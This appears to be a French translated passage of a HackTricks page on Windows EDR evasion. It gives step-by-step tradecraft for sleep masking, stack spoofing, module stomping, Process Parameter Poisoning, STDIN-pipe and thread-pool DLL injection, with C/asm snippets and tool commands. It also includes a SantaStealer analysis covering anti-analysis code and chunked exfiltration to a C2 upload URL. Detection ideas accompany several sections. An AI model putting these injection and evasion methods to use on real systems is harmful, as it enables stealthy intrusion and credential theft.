### Spoofing de pile compatible CET pour les threads en sommeil

Le remplacement complet de `CONTEXT` est bruyant et peut échouer sur les systèmes CET Shadow Stack, car un `Rip` usurpé doit toujours correspondre à la pile matérielle des appels fantômes. Un modèle de masquage du sommeil plus sûr consiste à :<sup>[[30]](#references)</sup>

- Choisir un autre thread du même processus et lire les limites de pile `NT_TIB` / TEB (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Sauvegarder le TEB/TIB réel du thread courant.
- Capturer le contexte réel du thread en sommeil avec `GetThreadContext`.
- Copier **uniquement** le `Rip` réel dans le contexte usurpé, en laissant intacts le `Rsp`/l’état de pile usurpés.
- Pendant la période de sommeil, copier le `NT_TIB` du thread usurpé dans le TEB courant afin que les parcours de pile se déroulent dans une plage de pile légitime.
- Une fois l’attente terminée, restaurer le TIB et le contexte de thread d’origine.

Cela préserve un pointeur d’instruction compatible CET tout en trompant les parcours de pile EDR qui se fient aux métadonnées de pile du TEB pour valider le déroulement.

### Alternative basée sur les APC : Kraken Mask

Si le dispatch par timer queue est trop reconnaissable, la même séquence de sommeil-chiffrement-spoofing-restauration peut être exécutée depuis un thread auxiliaire suspendu, à l’aide d’APC en file d’attente :<sup>[[27]](#references)</sup>

- Créez un thread auxiliaire dont le point d’entrée est `NtTestAlert`.
- Mettez en file d’attente les frames `CONTEXT`/APC préparées avec `NtQueueApcThread` et déclenchez-les avec `NtAlertResumeThread`.
- Stockez l’état de la chaîne sur le heap plutôt que sur la pile auxiliaire afin d’éviter d’épuiser la pile de thread par défaut de 64 Ko.
- Utilisez `NtSignalAndWaitForSingleObject` pour signaler atomiquement l’événement de démarrage et bloquer le thread.
- Suspendez le thread principal avant de restaurer le TIB/contexte (`NtSuspendThread` → restauration → `NtResumeThread`) afin de réduire la fenêtre de course pendant laquelle un scanner pourrait détecter une pile partiellement restaurée.

Cette méthode remplace la signature `CreateTimerQueueTimer` + `NtContinue` par une signature de thread auxiliaire/APC, tout en conservant les mêmes objectifs de masquage RC4 et de spoofing de pile.

Autres idées de détection
- `NtSetInformationVirtualMemory` avec `VmCfgCallTargetInformation` peu avant des périodes de sommeil, des attentes ou le dispatch d’APC.
- `GetThreadContext`/`SetThreadContext` autour de `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ou `ConnectNamedPipe`.
- `NtQueryInformationThread` suivi d’écritures directes dans les limites de pile du TEB/TIB du thread courant.
- Chaînes `NtQueueApcThread`/`NtAlertResumeThread` qui atteignent indirectement `SystemFunction032`, `VirtualProtect` ou des fonctions auxiliaires de restauration des permissions de section.
- Utilisation répétée de signatures de gadgets courtes comme `FF 23` (`jmp [rbx]`) ou `FF E7` (`jmp rdi`) comme pivots de dispatch dans des modules signés.


## Stomping de module de précision

Le module stomping exécute des payloads depuis la **section `.text` d’une DLL déjà mappée dans le processus cible**, au lieu d’allouer une mémoire exécutable privée évidente ou de charger une nouvelle DLL sacrificielle. La cible de l’écrasement doit être une **image chargée depuis le disque** dont l’espace de code peut accueillir le payload sans corrompre les chemins de code dont le processus a encore besoin.<sup>[[1]](#references)[[2]](#references)</sup>

### Sélection fiable de la cible

Le stomping naïf de modules courants comme `uxtheme.dll` ou `comctl32.dll` est fragile : la DLL peut ne pas être chargée dans le processus distant, et une région de code trop petite fera planter le processus. Une méthode plus fiable consiste à :

1. Énumérer les modules du processus cible et ne conserver qu’une **liste d’inclusion contenant les noms** des DLL déjà chargées.
2. Construire d’abord le payload et relever sa **taille exacte en octets**.
3. Parcourir les DLL candidates sur le disque et comparer la section PE **`.text` `Misc_VirtualSize`** à la taille du payload. C’est plus important que la taille du fichier, car cela reflète la taille de la section exécutable **une fois mappée en mémoire**.
4. Analyser l’**Export Address Table (EAT)** et choisir le RVA d’une fonction exportée comme décalage de départ du stomp.
5. Calculer le **rayon d’impact** : si le payload dépasse la limite de la fonction sélectionnée, il écrasera les exports adjacents disposés après celle-ci en mémoire.

Exemples d’outils de reconnaissance/sélection observés dans la nature :

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Privilégiez les DLLs **déjà chargées** dans le processus distant afin d’éviter la télémétrie de `LoadLibrary`/des chargements d’images inattendus.
- Privilégiez les exports rarement exécutés par l’application cible ; sinon, les chemins de code normaux peuvent atteindre les octets écrasés avant ou après la création du thread.
- Les implants volumineux nécessitent souvent de remplacer l’intégration du shellcode sous forme de littéral de chaîne par un **initialiseur de tableau d’octets/entre accolades**, afin que le tampon complet soit correctement représenté dans le code source de l’injecteur.

Detection ideas
- Écritures à distance dans des pages exécutables adossées à une image (`MEM_IMAGE`, `PAGE_EXECUTE*`), plutôt que dans les allocations privées RWX/RX plus courantes.
- Points d’entrée d’export dont les octets en mémoire ne correspondent plus à ceux du fichier associé sur le disque.
- Threads distants ou pivots de contexte qui commencent leur exécution dans un export légitime de DLL dont les premiers octets ont été modifiés récemment.
- Séquences suspectes de `VirtualProtect(Ex)` / `WriteProcessMemory` ciblant des pages `.text` de DLL, suivies de la création d’un thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) est une technique d’**injection de processus / d’évasion EDR** qui évite le chemin classique d’écriture à distance (`VirtualAllocEx` + `WriteProcessMemory`). Au lieu de copier des octets dans une cible déjà en cours d’exécution, elle exploite le fait que Windows **copie certains paramètres de démarrage de `CreateProcessW` dans le processus enfant** et les stocke dans `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Les carriers utiles sont :

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (avec `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Contraintes pratiques des carriers :

- `lpCommandLine` doit pointer vers de la **mémoire accessible en écriture** pour `CreateProcessW` et est limité à **32 767 caractères Unicode**, terminateur nul compris.
- `lpEnvironment` doit être un bloc d’environnement Unicode composé de chaînes `NAME=VALUE\0` successives, terminées par un `\0` supplémentaire.
- `lpReserved` est officiellement réservé ; le mapping vers `ShellInfo` doit donc être considéré comme un détail d’implémentation plutôt que comme un contrat documenté stable.

La création normale d’un processus devient ainsi la **primitive de transfert de payload**. L’opérateur crée le processus enfant avec des données de démarrage contrôlées par l’attaquant et laisse Windows effectuer la copie interprocessus.

### Remote lookup flow without remote write APIs

Une fois l’enfant créé, recherchez le tampon copié à l’aide de primitives **en lecture seule** :

1. `NtQueryInformationProcess(ProcessBasicInformation)` → obtenir `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lire le `PEB` distant
3. Suivre `PEB.ProcessParameters`
4. Lire `RTL_USER_PROCESS_PARAMETERS`
5. Utiliser le pointeur sélectionné :
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Flux minimal :

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Exécution du tampon de paramètres copié

La région de paramètres copiée est généralement `RW`, et non exécutable. Une chaîne P3 courante consiste à :

1. Créer le processus normalement (sans le suspendre)
2. Rendre exécutable la page de paramètres choisie avec `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Réutiliser le handle du thread principal déjà renvoyé dans `PROCESS_INFORMATION`
4. Rediriger l’exécution avec `NtSetContextThread` (`CONTEXT_CONTROL`, écraser `RIP`)

Contrairement aux workflows classiques de détournement de thread, cela ne **nécessite pas** `SuspendThread` / `ResumeThread` ; le contexte peut être modifié directement à l’aide du handle du thread principal renvoyé.

Cela évite plusieurs API souvent surveillées pour détecter l’injection :

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- souvent aussi `SuspendThread` / `ResumeThread`

### Limitation liée aux octets nuls et shellcode à plusieurs étapes

Les trois vecteurs sont des **données de type chaîne ou assimilées**, donc un payload brut contenant `0x00` est tronqué pendant le transfert. Une solution pratique consiste à utiliser un **premier stage sans octets nuls** qui reconstruit les constantes à l’exécution, puis charge un second stage arbitraire.

Un schéma simple consiste à synthétiser des constantes avec XOR :

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Cela permet à la première étape de construire des chaînes sur la stack, des arguments d’API, des chemins de DLL ou un loader de shellcode de deuxième étape sans intégrer d’octets nuls dans le paramètre transmis.

### Appels d’API basés sur la stack depuis la première étape

Lorsque la première étape doit appeler des API telles que `LoadLibraryA`, elle peut :

- empiler la chaîne/le buffer sur la stack de la cible
- réserver les **32 octets de shadow space x64**
- définir `RCX`, `RDX`, `R8`, `R9` avec des constantes ou des pointeurs relatifs à `RSP`
- maintenir `RSP` **aligné sur 16 octets** avant l’appel

La deuxième étape peut ensuite être copiée depuis la stack vers une allocation `PAGE_READWRITE`, basculée en `PAGE_EXECUTE_READ` avec `VirtualProtect`, puis exécutée par saut, ce qui évite une allocation RWX directe.

### Pistes de détection

Les auteurs mentionnent les pistes d’investigation intéressantes suivantes :

- `VirtualProtectEx` / `NtProtectVirtualMemory` rendant exécutables les **pages des paramètres de processus**
- ce changement de protection suivi de `SetThreadContext` / `NtSetContextThread`
- lectures à distance du `PEB`, puis de `RTL_USER_PROCESS_PARAMETERS`
- valeurs `lpCommandLine`, `lpEnvironment` ou `STARTUPINFO.lpReserved` anormalement longues / à forte entropie lors de la création du processus

### Remarques

- P3 est une **technique de transfert interprocessus**, pas une primitive d’exécution complète à elle seule : le paramètre copié nécessite toujours un changement de permissions pour être exécutable et une méthode de redirection de l’exécution.
- `RtlCreateProcessReflection` / Dirty Vanity a été envisagé par les auteurs, mais écarté, car cette méthode finit par utiliser en interne des primitives suspectes telles que `NtWriteVirtualMemory` et `NtCreateThreadEx`.

## Injection via un pipe STDIN de console

Un enfant de console interactif peut aussi servir de **primitive de transfert de payload**. L’injecteur redirige l’entrée standard de l’enfant vers un pipe et envoie un marqueur suivi du shellcode. Une fois les données lues par le programme de console dans sa propre mémoire privée, l’injecteur trouve ce buffer, le rend exécutable et redirige un thread enfant vers celui-ci. Cette méthode évite `VirtualAllocEx` et `WriteProcessMemory`, mais reste de l’injection de processus, et non un bypass EDR général.<sup>[[41]](#references)</sup>

Malgré la description « named-pipe », l’implémentation de référence appelle `CreatePipe`, qui crée un **pipe anonyme**. Windows implémente les pipes anonymes au moyen d’objets de pipe nommés de manière unique en interne, mais le PoC ne sélectionne pas de chemin `\\.\pipe\<name>` et n’appelle pas `CreateNamedPipe`. Il crée des handles héritables avec un descripteur de sécurité par défaut, place le handle de lecture dans `STARTUPINFO.hStdInput`, définit `STARTF_USESTDHANDLES` et lance un nouvel enfant avec l’héritage des handles activé. Par conséquent, ce PoC lance l’exécutable de console fourni ; il ne rattache pas son pipe à un processus existant.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Workflow de référence

L’implémentation suit la chaîne suivante :<sup>[[41]](#references)</sup>

1. Créer des paires de pipes anonymes pour le `STDIN` et le `STDOUT` de l’enfant. Désactiver l’héritage sur les deux handles côté parent et fermer les doublons côté enfant dans le parent après la création du processus.
2. Lancer un exécutable interactif tel que `netsh.exe` ou `nslookup.exe` avec `CREATE_NEW_CONSOLE`. L’enfant hérite des handles standard redirigés.
3. Envoyer le tableau binaire `rawData` complet avec `WriteFile` via le handle `STDIN` côté parent. Le programme de console consomme les octets et en laisse une copie dans l’une de ses régions privées validées.
4. Parcourir l’espace d’adressage de l’enfant avec `VirtualQueryEx`, lire les régions candidates `MEM_PRIVATE` avec `ReadProcessMemory`, puis rechercher le marqueur au début de `rawData`.
5. Modifier les permissions du buffer découvert en `PAGE_EXECUTE_READWRITE` avec `VirtualProtectEx`.
6. Identifier le thread principal, le suspendre, définir `RIP` sur `found_address + 0x19` avec `NtSetContextThread`, puis le reprendre.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

L’implémentation fournie est spécifique à x64 : elle modifie `CONTEXT.Rip`, et son payload intégré est du shellcode x64. `rawData` commence par un marqueur de 25 octets ; les octets exécutables commencent donc à l’offset hexadécimal `0x19`. Lors du remplacement du payload, conservez cette disposition ou mettez à jour ensemble le marqueur, le vecteur de recherche, la taille du tableau et l’offset d’exécution. Les commentaires du code source indiquent également que `0x0A`, `0x0D` et `0x1A` sont des bad characters. Ce workflow ne modifie ni le token ni les privilèges du processus enfant.<sup>[[41]](#references)</sup>

Pour des helpers natifs simples et des exemples de compilation de payloads, voir [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Injection de DLL par callback de thread pool sans shellcode (DLLParty)

DLLParty adapte l’injection de thread pool de type PoolParty pour qu’un worker existant de la cible appelle `LoadLibraryA`, au lieu d’exécuter un stub de callback injecté. Son primitive de dispatch est un `TP_DIRECT` envoyé au port de complétion I/O du pool cible. Cela ne contourne pas les permissions du processus : le PoC appelle `OpenProcess(PROCESS_ALL_ACCESS)` et nécessite une mémoire cible lisible et modifiable, ainsi que des handles de worker factory et de port de complétion duplicables.<sup>[[46]](#references)[[47]](#references)</sup>

Sous Windows x64, le worker transmet dans `RCX`, le premier argument du callback, un pointeur vers le `TP_CALLBACK_INSTANCE` stocké sur sa pile. `LoadLibraryA` interprète ce même pointeur comme un `LPCSTR`. Sur le chemin testé, `TppWorkerThread` construit le pointeur à `RSP+0x178`, tandis que sa première écriture ordinaire dans cet objet a lieu à `RSP+0x1d0`. Un chemin de DLL terminé par un octet nul et tenant dans ce préfixe de 0x58 octets peut donc occuper le début de l’instance sans être écrasé avant le dispatch. Il s’agit d’une observation propre à cette build, et non d’une garantie documentée de l’ABI Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Le workflow de référence est le suivant :<sup>[[46]](#references)[[47]](#references)</sup>

1. Énumérer les handles de la cible avec `NtQuerySystemInformation(SystemHandleInformation)` et identifier `TpWorkerFactory` en interrogeant les types d’objets. Dupliquer un handle de worker factory et interroger `WorkerFactoryBasicInformation` ; `StartParameter` fournit le `TP_POOL` distant. Ignorer les factories dont `TotalWorkerCount == 0`.
2. Lire `TP_POOL.CompletionPort` et parcourir la liste privée des workers du pool. Sur la build x64 Windows 10 19045 testée (`ntdll.dll 10.0.19041.4842`), la tête se trouve à `pool+0x60` ; chaque lien se trouve à `worker+0x10`, de sorte que l’emplacement de l’instance de callback à `worker+0x38` équivaut à `link+0x28`. Le PoC vérifie l’alignement des pointeurs, la réciprocité des liens, l’appartenance au pool, les identifiants de thread non nuls, les nœuds répétés et la stabilité de la tête de liste.
3. Écrire le chemin de la DLL dans **chaque** emplacement de worker récupéré, car le completion envoyé peut être consommé par n’importe quel worker. Placer un `TP_DIRECT` avec `Callback = LoadLibraryA` dans une zone mémoire cible modifiable. Le PoC utilise `last_slot-0x500` sur une pile de worker au lieu de `VirtualAllocEx` ; cet offset est expérimental et ne doit pas chevaucher des données de pile actives.
4. Dupliquer le handle du port de complétion cible et appeler `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. L’adresse du `TP_DIRECT` distant est la clé de complétion. Un worker existant appelle alors `LoadLibraryA` avec son pointeur d’instance de callback écrasé, ce qui charge une DLL déjà accessible à la cible.

Le PoC prend un PID cible (`DLLParty.exe <target_pid>`) et utilise un chemin de DLL codé en dur dans `DLLParty.cpp` ; définissez un chemin accessible à la cible avant de compiler un exécutable x64. Il utilise également l’adresse de `LoadLibraryA` de son propre processus comme callback distant, ce qui suppose que cette adresse est valide dans la cible. Le code ne vérifie ni que la longueur du chemin tient dans le préfixe de 0x58 octets, ni que le parcours des workers a trouvé un emplacement avant d’indexer le dernier élément. Revérifiez les offsets privés, la disposition de la pile et l’espace modifiable pour la build cible. L’omission de `CreateRemoteThreadEx`, du shellcode et de `VirtualAllocEx` n’élimine ni les écritures entre processus ni la télémétrie de chargement de DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Techniques de SantaStealer pour l’évasion sans fichier et le vol d’identifiants

SantaStealer (alias BluelineStealer) illustre comment les infostealers modernes combinent AV bypass, anti-analyse et accès aux identifiants dans un même workflow.<sup>[[24]](#references)</sup>

### Filtrage selon la disposition du clavier et délai en sandbox

- Un indicateur de configuration (`anti_cis`) énumère les dispositions de clavier installées via `GetKeyboardLayoutList`. Si une disposition cyrillique est détectée, l’échantillon crée un marqueur `CIS` vide et s’arrête avant d’exécuter les stealers, évitant ainsi toute exécution dans les régions exclues tout en laissant une trace utile à la détection.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Logique `check_antivm` à plusieurs niveaux

- La variante A parcourt la liste des processus, calcule un hash de chaque nom à l’aide d’une somme de contrôle glissante personnalisée, puis le compare à des listes de blocage intégrées pour les debuggers/sandboxes ; elle répète le calcul sur le nom de l’ordinateur et vérifie des répertoires de travail tels que `C:\analysis`.
- La variante B examine les propriétés du système (seuil minimal du nombre de processus, temps de fonctionnement récent), appelle `OpenServiceA("VBoxGuest")` pour détecter les additions VirtualBox et effectue des contrôles de temporisation autour des pauses afin de repérer l’exécution pas à pas. Toute détection interrompt le processus avant le lancement des modules.

### Helper sans fichier + reflective loading à double ChaCha20

- La DLL/EXE principale intègre un helper d’identifiants Chromium qui est soit déposé sur le disque, soit mappé manuellement en mémoire ; en mode sans fichier, il résout lui-même les imports/relocations afin qu’aucun artefact du helper ne soit écrit.
- Ce helper stocke une DLL de deuxième étape chiffrée deux fois avec ChaCha20 (deux clés de 32 octets et deux nonces de 12 octets). Après les deux passes, il charge le blob par reflective loading (sans `LoadLibrary`) et appelle les exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` dérivés de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Les routines de ChromElevator utilisent le process hollowing par reflective loading avec direct syscalls pour injecter le code dans un navigateur Chromium actif, hériter des clés AppBound Encryption et déchiffrer les mots de passe/cookies/cartes de crédit directement depuis les bases de données SQLite, malgré le renforcement d’ABE.


### Collecte modulaire en mémoire et exfiltration HTTP par blocs

- `create_memory_based_log` parcourt une table globale de pointeurs de fonction `memory_generators` et lance un thread par module activé (Telegram, Discord, Steam, captures d’écran, documents, extensions de navigateur, etc.). Chaque thread écrit les résultats dans des buffers partagés et indique le nombre de fichiers après une fenêtre d’attente d’environ 45 s.
- Une fois la collecte terminée, l’ensemble est compressé avec la bibliothèque `miniz`, liée statiquement, sous `%TEMP%\\Log.zip`. `ThreadPayload1` attend ensuite 15 s et transmet l’archive par blocs de 10 Mo via HTTP POST à `http://<C2>:6767/upload`, en usurpant une boundary de navigateur `multipart/form-data` (`----WebKitFormBoundary***`). Chaque bloc ajoute `User-Agent: upload`, `auth: <build_id>`, éventuellement `w: <campaign_tag>`, et le dernier bloc ajoute `complete: true` pour signaler au C2 que le réassemblage est terminé.

## References

- [1] [Techniques avancées d’évasion : précision du module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Les piles d’appels : fini les passe-droits pour les malwares](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentation](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – exemple](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – exemple](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC de falsification de pile d’appels](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nouvelle chaîne d’infection et obfuscation basée sur ConfuserEx pour le stealer DarkCloud](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Peut-on faire confiance au zero trust ? Contourner les contrôles de posture de Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Avant ToolShell : exploration des opérations de ransomware antérieures de Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading : abus des exports transférés](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventaire des exports transférés de Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Ordre de recherche des bibliothèques de liens dynamiques](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Sécurité des processus et droits d’accès](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Référence EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Lanceur CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Contrer les EDR avec la protection des processus protégés (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Briser la coque protectrice de Windows Defender avec la technique de redirection de dossier](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Référence de la commande mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Sous le rideau pur : du RAT au builder, puis au codeur](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer arrive en ville : un nouveau stealer ambitieux](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Déchiffrement de Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader : déjouer les malwares Node.js grâce au traçage des API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [La Belle au bois dormant : mettre Adaptix au lit avec Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Empoisonnement des paramètres de processus](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [La Belle au bois dormant II : CFG, CET et falsification de pile](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Obfuscation de veille Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Masquer votre Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abuser de Chrome Remote Desktop lors des opérations Red Team : guide pratique](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged : transformer le pilote de remédiation de Defender en primitive d’opération noyau](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Code compagnon MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo : créer des fonctions auto-masquantes avec LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Source InjectSetConsole de TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Fonction CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Création d’un processus enfant avec redirection des entrées et sorties](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - Nécromancie GhostPack : reforger des outils C# avec WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiler des projets C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty : preuve de concept et code source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abuser des mécanismes internes du pool de threads pour l’injection de DLL sans shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Jeu de données de référence EMBER2024 et outils thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Utiliser EMBER2024 pour évaluer des implants Red Team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Échapper aux détections basées sur le machine learning](https://msecops.de/blog/posts/ml-evasion/)
{{#include ../banners/hacktricks-training.md}}
